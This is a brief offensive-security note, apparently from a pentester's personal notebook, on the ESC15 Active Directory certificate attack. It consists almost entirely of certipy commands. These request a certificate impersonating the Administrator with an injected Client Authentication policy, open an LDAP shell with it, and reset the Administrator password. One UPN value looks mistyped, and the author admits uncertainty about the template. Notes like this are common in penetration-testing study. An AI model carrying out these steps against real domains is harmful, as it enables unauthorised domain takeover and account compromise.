- certipy req -dc-ip <IP> -ca <CA> -target-ip <IP> -u <user@domain> -p <password> -template <template> -upn Administrator.pfx@<domain> -application-policies ‘Client Authentication’
    
    - template might always be WebServer but I’m not sure
    
![image 415.png](../../assets/ESC15/image%20415.png)
  
with the administrator.pfx, authenticate to an LDAP shell
- certipy auth -pfx administrator.pfx -dc-ip <IP> -ldap-shell
![image 1 310.png](../../assets/ESC15/image%201%20310.png)
  
  
from here, you can change the administrator password
- change_password Administrator <password>
![image 2 261.png](../../assets/ESC15/image%202%20261.png)